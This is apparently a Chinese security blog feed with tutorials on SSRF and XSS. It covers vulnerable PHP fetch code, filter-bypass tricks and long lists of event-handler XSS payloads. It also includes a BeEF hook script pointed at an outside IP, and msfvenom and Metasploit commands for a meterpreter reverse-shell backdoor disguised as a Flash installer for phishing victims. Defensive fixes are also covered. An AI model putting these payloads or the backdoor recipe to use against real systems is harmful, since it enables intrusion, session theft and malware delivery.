    <content><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h4 id="SSRF漏洞概述"><a href="#SSRF漏洞概述" class="headerlink" title="SSRF漏洞概述"></a>SSRF漏洞概述</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</span><br></pre></td></tr></table></figure>

<h4 id="怎么产生SSRF漏洞"><a href="#怎么产生SSRF漏洞" class="headerlink" title="怎么产生SSRF漏洞"></a>怎么产生SSRF漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多Web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL，Web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。</span><br><span class="line">服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制.</span><br></pre></td></tr></table></figure>

<p>大部分的web服务器架构中，web服务器自身都可以访问互联网和服务器所在的内网。</p>
<p><img src="/../images/image-20230503125426240.png"></p>
<h4 id="SSRF能利用的地方"><a href="#SSRF能利用的地方" class="headerlink" title="SSRF能利用的地方"></a>SSRF能利用的地方</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。</span><br><span class="line">攻击运行在内网或者本地的应用程序。</span><br><span class="line">对内网web应用进行指纹识别，通过访问默认文件实现 。</span><br><span class="line">攻击内外网的web应用。sql注入、struct2、redis等。</span><br><span class="line">利用file协议读取本地文件等。</span><br></pre></td></tr></table></figure>

<h4 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) &#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg’;</span><br><span class="line"> file_put_contents($filename, $content); </span><br><span class="line">echo $_POST[&#x27;url’]; </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fsockopen</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function GetFile($host, $port, $link)</span><br><span class="line">&#123;</span><br><span class="line">    //fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用</span><br><span class="line">    //（例如： fgets() ， fgetss() ，</span><br><span class="line">    // fwrite() ， fclose() 还有 feof() ）。如果调用失败，将返回 FALSE 。</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);</span><br><span class="line">    if (!$fp) &#123;</span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $out = &quot;GET $link HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out .= &quot;Host: $host\r\n&quot;;</span><br><span class="line">        $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">        $out .= &quot;\r\n&quot;;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $contents = &#x27;&#x27;;</span><br><span class="line">        while (! feof($fp)) &#123;</span><br><span class="line">            $contents .= fgets($fp, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$host = $_GET[&#x27;host&#x27;];</span><br><span class="line">$port = $_GET[&#x27;port&#x27;];</span><br><span class="line">$link = $_GET[&#x27;link&#x27;];</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl_exec</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))&#123;</span><br><span class="line">$link = $_POST[&#x27;url’];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($curlobj);curl_close($curlobj);</span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt’;</span><br><span class="line">file_put_contents($filename, $result);</span><br><span class="line"> echo $result;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一.Web功能查找</span><br><span class="line">二.通过URL地址分享网页内容</span><br><span class="line">三.转码服务</span><br><span class="line">四.在线翻译</span><br><span class="line">五.图片加载与下载</span><br></pre></td></tr></table></figure>

<h4 id="SSRF漏洞验证"><a href="#SSRF漏洞验证" class="headerlink" title="SSRF漏洞验证"></a>SSRF漏洞验证</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一:</span><br><span class="line">http://www.baidu.com/ShowImage.aspx?ImageUrl=http://www.a.com/a.jpg</span><br><span class="line">1）我们先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是</span><br><span class="line">http://www.a.com/a.jpg，（说明不存在SSRF漏洞。）</span><br><span class="line">http://www.baidu.com/uploads/2021080924.jpg  （不存在）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式二:</span><br><span class="line">	可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含http://www.a.com/a.jpg这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。</span><br><span class="line">http://127.0.0.1</span><br><span class="line">此处找内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址</span><br></pre></td></tr></table></figure>

<h4 id="SSRF常见限制"><a href="#SSRF常见限制" class="headerlink" title="SSRF常见限制"></a>SSRF常见限制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.限制为http://www.xxx.com 域名</span><br><span class="line">采用http基本身份认证的方式绕过。即@</span><br><span class="line">http://www.xxx.com@www.xxc.com</span><br><span class="line"></span><br><span class="line">2.限制请求IP不为内网地址</span><br><span class="line">当不允许ip为内网地址时</span><br><span class="line">（1）采取短网址绕过</span><br><span class="line">（2）采取特殊域名</span><br><span class="line">（3）采取进制转换</span><br><span class="line"></span><br><span class="line">3.限制请求只为http协议</span><br><span class="line">（1）采取302跳转</span><br><span class="line">（2）采取短地址</span><br></pre></td></tr></table></figure>

<h4 id="SSRF常用协议"><a href="#SSRF常用协议" class="headerlink" title="SSRF常用协议"></a>SSRF常用协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict协议</span><br><span class="line">file协议</span><br><span class="line">http协议</span><br><span class="line">ftp协议(扫描端口极其好用)</span><br><span class="line">gopher协议</span><br></pre></td></tr></table></figure>

<h4 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态</span><br><span class="line"></span><br><span class="line">2.限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等 </span><br><span class="line"></span><br><span class="line">3.黑名单内网IP。</span><br><span class="line"></span><br><span class="line">4.禁用不需要的协议，仅仅允许HTTP和HTTPS.</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>XSS跨站脚本攻击</title>
    <url>/2023/05/03/XSS/</url>
    <content><![CDATA[<h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p>指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，</p>
<p>从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。</p>
<p>-数据交互的地方</p>
<p>​	get、post、headers</p>
<p>​	反馈与浏览</p>
<p>​	富文本编辑器</p>
<p>​	各类标签插入和自定义			</p>
<p>-数据输出的地方</p>
<p>​	用户资料</p>
<p>​	关键词、标签、说明</p>
<p>​	文件上传(XSS)</p>
<h2 id="2、危害"><a href="#2、危害" class="headerlink" title="2、危害"></a>2、危害</h2><ol>
<li><p>网络钓鱼，包括获取各类用户账号；</p>
</li>
<li><p>窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；</p>
</li>
<li><p>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；</p>
</li>
<li><p>强制弹出广告页面、刷流量等；</p>
</li>
<li><p>网页挂马；</p>
</li>
<li><p>进行恶意操作，如任意篡改页面信息、删除文章等； XSS+CSRF</p>
</li>
<li><p>进行大量的客户端攻击，如ddos等；</p>
</li>
<li><p>获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</p>
</li>
<li><p>控制受害者机器向其他网站发起攻击；</p>
</li>
<li><p>结合其他漏洞，如csrf,实施进一步危害；</p>
</li>
<li><p>提升用户权限，包括进一步渗透网站；</p>
</li>
<li><p>传播跨站脚本蠕虫等</p>
</li>
</ol>
<h2 id="3、分类"><a href="#3、分类" class="headerlink" title="3、分类"></a>3、分类</h2><h3 id="3-1、反射型（非持久型）"><a href="#3-1、反射型（非持久型）" class="headerlink" title="3.1、反射型（非持久型）"></a>3.1、反射型（非持久型）</h3><p>反射型XSS也叫非持久型XSS，最常见的是Payload是构造在网址的某个GET参数的值里。 比如这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xx.com/company/search.html?key_pro=&quot;&gt;&lt;script&gt;confirm(1501)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="3-2、存储型（持久型）"><a href="#3-2、存储型（持久型）" class="headerlink" title="3.2、存储型（持久型）"></a>3.2、存储型（持久型）</h3><p>存储型XSS也叫持久型XSS，存储的意思就是Payload是有经过存储的，当一个页面存在存储型XSS的时候，XSS注入成功后，那么每次访问该页面都将触发XSS，典型的例子是：</p>
<p>如留言板</p>
<ol>
<li>插入留言&#x3D;&gt;内容存储到数据库</li>
<li>查看留言&#x3D;&gt;内容从数据库提取出来</li>
<li>内容在页面显示</li>
</ol>
<p>如果这里存在XSS，Payload可以通过留言内容提交，然后显示在页面的时候可以生效，那么就是典型的存储型XSS。</p>
<h3 id="3-3、DOM型"><a href="#3-3、DOM型" class="headerlink" title="3.3、DOM型"></a>3.3、DOM型</h3><p>反射型和存储型都是通过后台输出，DOM xss是纯前台的漏洞</p>
<p>DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情，无法通过WAF防护。</p>
<p>二、哪里有DOM XSS<br>1、js中，从url中获得参数并将其作为js执行<br>检查eval(), execScript(), setInterval(), setTimeout()，Function()参数是否通过URL可控。<br>这些关键字中，它们的参数作为js&#x2F;html的代码进行执行，即可以动态执行代码。<br>2、如果输出的来源是用户，则有XSS风险<br>innerHTML、document.write</p>
<p><img src="/../images/image-20230411154032368.png" alt="image-20230411154032368"></p>
<h3 id="3-4、UXSS（通用型xss）"><a href="#3-4、UXSS（通用型xss）" class="headerlink" title="3.4、UXSS（通用型xss）"></a>3.4、UXSS（通用型xss）</h3><p>是利用<strong>浏览器或者浏览器扩展漏洞</strong>来制造产生XSS代码的一种攻击类型。</p>
<p>挖掘方法就是不断测试浏览器的各种功能</p>
<p>ABC.html</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;   //中文</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;   //英文</span><br></pre></td></tr></table></figure>



<p>(比如一个浏览器访问网页没有触发XSS漏洞，使用翻译功能时页面却会产生XSS漏洞)</p>
<h3 id="3-5、PDF-XSS"><a href="#3-5、PDF-XSS" class="headerlink" title="3.5、PDF XSS"></a>3.5、PDF XSS</h3><p>PDF–&gt;js</p>
<p>app.alert(1);</p>
<p><img src="/../images/image-20221203193224897-16831002517833.png" alt="image-20221203193224897"></p>
<p><img src="/../images/image-20221219092453905.png" alt="image-20221219092453905"></p>
<h2 id="4、-xss-常见标签语句"><a href="#4、-xss-常见标签语句" class="headerlink" title="4、 xss 常见标签语句"></a>4、 xss 常见标签语句</h2><p>html中的事件：</p>
<h3 id="0x01-lt-a-gt-标签"><a href="#0x01-lt-a-gt-标签" class="headerlink" title="0x01. **&lt; a&gt;**标签"></a>0x01. **&lt; a&gt;**标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://baidu.com&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x02-lt-img-gt-标签"><a href="#0x02-lt-img-gt-标签" class="headerlink" title="0x02. &lt; img&gt;标签"></a>0x02. &lt; img&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=“&#123;payload&#125;” onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x03-lt-iframe-gt-标签"><a href="#0x03-lt-iframe-gt-标签" class="headerlink" title="0x03. &lt; iframe&gt;标签"></a>0x03. &lt; iframe&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x04-lt-audio-gt-标签"><a href="#0x04-lt-audio-gt-标签" class="headerlink" title="0x04. &lt; audio&gt; 标签"></a>0x04. &lt; audio&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="0x05-lt-video-gt-标签"><a href="#0x05-lt-video-gt-标签" class="headerlink" title="0x05. &lt; video&gt;标签"></a>0x05. &lt; video&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x06-lt-svg-gt-标签"><a href="#0x06-lt-svg-gt-标签" class="headerlink" title="0x06. &lt; svg&gt; 标签"></a>0x06. &lt; svg&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x07-lt-button-gt-标签"><a href="#0x07-lt-button-gt-标签" class="headerlink" title="0x07. &lt; button&gt; 标签"></a>0x07. &lt; button&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x08-lt-div-gt-标签"><a href="#0x08-lt-div-gt-标签" class="headerlink" title="0x08. &lt; div&gt;标签"></a>0x08. &lt; div&gt;标签</h3><p>这个需要借助url编码来实现绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x09-lt-object-gt-标签"><a href="#0x09-lt-object-gt-标签" class="headerlink" title="0x09. &lt; object&gt;标签"></a>0x09. &lt; object&gt;标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x10-lt-script-gt-标签"><a href="#0x10-lt-script-gt-标签" class="headerlink" title="0x10. &lt; script&gt; 标签"></a>0x10. &lt; script&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x11-lt-p-gt-标签"><a href="#0x11-lt-p-gt-标签" class="headerlink" title="0x11. &lt; p&gt; 标签"></a>0x11. &lt; p&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x12-lt-input-gt-标签"><a href="#0x12-lt-input-gt-标签" class="headerlink" title="0x12. &lt; input&gt; 标签"></a>0x12. &lt; input&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x13-lt-details-gt-标签"><a href="#0x13-lt-details-gt-标签" class="headerlink" title="0x13. &lt; details&gt;标签"></a>0x13. &lt; details&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x14-lt-select-gt-标签"><a href="#0x14-lt-select-gt-标签" class="headerlink" title="0x14. &lt; select&gt; 标签"></a>0x14. &lt; select&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x15-lt-form-gt-标签"><a href="#0x15-lt-form-gt-标签" class="headerlink" title="0x15. &lt; form&gt; 标签"></a>0x15. &lt; form&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt; </span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt; </span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>



<h3 id="0x16-lt-body-gt-标签"><a href="#0x16-lt-body-gt-标签" class="headerlink" title="0x16. &lt; body&gt; 标签"></a>0x16. &lt; body&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>



<h2 id="5-XSS实战利用"><a href="#5-XSS实战利用" class="headerlink" title="5.XSS实战利用"></a>5.XSS实战利用</h2><h3 id="5-1、XSS利用平台"><a href="#5-1、XSS利用平台" class="headerlink" title="5.1、XSS利用平台"></a>5.1、XSS利用平台</h3><p>XSS平台</p>
<p><a href="https://xss.pt/">https://xss.pt/</a></p>
<p>Beef-XSS</p>
<p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -p 3000:3000 janes/beef &amp;</span><br><span class="line"></span><br><span class="line">http://&lt;ip&gt;:3000/ui/authentication</span><br><span class="line"></span><br><span class="line">账户/密码：beef/beef</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">&lt;script src=&#x27;http://192.168.156.146:3000/hook.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20230412003256979.png" alt="image-20230412003256979"></p>
<h3 id="5-2、-后台植入Cookie-amp-表单劫持"><a href="#5-2、-后台植入Cookie-amp-表单劫持" class="headerlink" title="5.2、**后台植入Cookie&amp;表单劫持  **"></a>5.2、**后台植入Cookie&amp;表单劫持  **</h3><p>​												—<strong>权限维持</strong></p>
<p>利用条件：XSS存储型控制对方网站源码</p>
<h3 id="5-3、Flash钓鱼配合木马捆绑上线"><a href="#5-3、Flash钓鱼配合木马捆绑上线" class="headerlink" title="5.3、Flash钓鱼配合木马捆绑上线"></a><strong>5.3、Flash钓鱼配合木马捆绑上线</strong></h3><p>​												—配合XSS钓鱼</p>
<p>-条件：beef上线受控后或直接钓鱼</p>
<p>1、生成后门</p>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xx.xx.xx.xx LPORT&#x3D;6666 -f exe &gt; flash.exe</p>
<p>2、下载官方文件-保证安装正常</p>
<p>3、压缩捆绑文件-解压提取运行</p>
<p>4、MSF配置监听状态</p>
<p>use exploit&#x2F;multi&#x2F;handler</p>
<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
<p>set lhost 0.0.0.0</p>
<p>set lport 6666</p>
<p>run</p>
<p>5、诱使受害者访问URL-语言要适当</p>
<h3 id="5-4、XSS靶场"><a href="#5-4、XSS靶场" class="headerlink" title="5.4、XSS靶场"></a>5.4、XSS靶场</h3><p><a href="http://43.138.215.2/xssGo/">http://43.138.215.2/xssGo/</a></p>
<h2 id="6-XSS修复"><a href="#6-XSS修复" class="headerlink" title="6.XSS修复"></a>6.XSS修复</h2><h3 id="6-1、过滤危险字符"><a href="#6-1、过滤危险字符" class="headerlink" title="6.1、过滤危险字符"></a>6.1、过滤危险字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">转义&amp; &lt;&gt; &quot; &#x27; \ 等危险字符</span><br><span class="line">自定义过滤函数引用</span><br></pre></td></tr></table></figure>



<h3 id="6-2、HTTP-only"><a href="#6-2、HTTP-only" class="headerlink" title="6.2、HTTP-only"></a>6.2、HTTP-only</h3><p><a href="https://www.php.cn/php-ask-457831.html">https://www.php.cn/php-ask-457831.html</a></p>
<p>php.ini设置或代码引用</p>
<p>session.cookie_httponly &#x3D;1</p>
<p>ini_set(“session.cookie_httponly”, 1);</p>
<h3 id="6-3、设置CSP-Content-Security-Policy"><a href="#6-3、设置CSP-Content-Security-Policy" class="headerlink" title="6.3、设置CSP(Content Security Policy)"></a>6.3、设置CSP(Content Security Policy)</h3><p><a href="https://blog.csdn.net/a1766855068/article/details/89370320">https://blog.csdn.net/a1766855068/article/details/89370320</a></p>
<p>header(“Content-Security-Policy:img-src ‘self’ “);</p>
<h3 id="6-4、输入内容长度限制，实体转义等"><a href="#6-4、输入内容长度限制，实体转义等" class="headerlink" title="6.4、输入内容长度限制，实体转义等"></a>6.4、输入内容长度限制，实体转义等</h3><p><strong>由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，</strong></p>
<p><strong>所以可以编码方式进行组合绕过。</strong></p>
<p><strong>注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。</strong></p>
<h2 id="7-XSS-过滤绕过"><a href="#7-XSS-过滤绕过" class="headerlink" title="7.XSS 过滤绕过"></a>7.XSS 过滤绕过</h2><p>编码&#x2F;&#x2F;标点符号&#x2F;&#x2F;关键字(大小写&#x2F;双写…..)</p>
